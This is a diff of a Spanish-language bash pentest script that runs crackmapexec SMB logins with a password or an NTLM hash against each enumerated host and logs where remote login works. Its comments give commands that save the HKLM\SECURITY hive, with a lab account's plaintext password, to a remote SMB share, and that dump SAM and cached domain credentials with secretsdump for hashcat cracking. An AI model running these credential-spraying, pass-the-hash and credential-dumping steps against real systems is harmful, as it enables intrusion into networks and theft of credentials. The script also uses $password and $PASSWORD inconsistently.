@@ -63,12 +63,12 @@ fi
 #   reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.132\share'
 #3) secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
 #   secretsdump -security SECURITY.save -system SYSTEM.save LOCAL # DCC2 (Domain Cached credentials 2 ) hashcat mode 2100
-echo -e "$OKBLUE Probando con usuario: $USUARIO  y hash $HASH $RESET"
+echo -e "$OKBLUE  USUARIO:$USUARIO HASH:$HASH PASSWORD:$PASSWORD $RESET"
 ######################
 
   for ip in $(ls .enumeracion2_archived| grep 'crackmapexec' | cut -d "_" -f1); do
 			echo -e "[+] $OKBLUE Testeando $ip .. $RESET"
-			if [ -z $HASH ] ; then
+			if [ "$PASSWORD" != NULL ] ; then
 			#echo "PASSWORD $PASSWORD"				
 				echo "Usando password $PASSWORD"
 				crackmapexec smb $ip -u $USUARIO -p $PASSWORD --local-auth  | tee logs/vulnerabilidades/"$ip"_smb_logeoRemoto1.txt #local
@@ -84,7 +84,7 @@ echo -e "$OKBLUE Probando con usuario: $USUARIO  y hash $HASH $RESET"
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then						
 				echo -e "\t$OKRED[i] Logeo remoto habilitado $RESET"
-				if [ -z $HASH ] ; then
+				if [ "$PASSWORD" != NULL ] ; then
 					echo -e "Usuario:$USUARIO Pasword:$password (local)" >> .vulnerabilidades/"$ip"_smb_logeoRemoto.txt
 				else
 					echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (local)" >> .vulnerabilidades/"$ip"_smb_logeoRemoto.txt
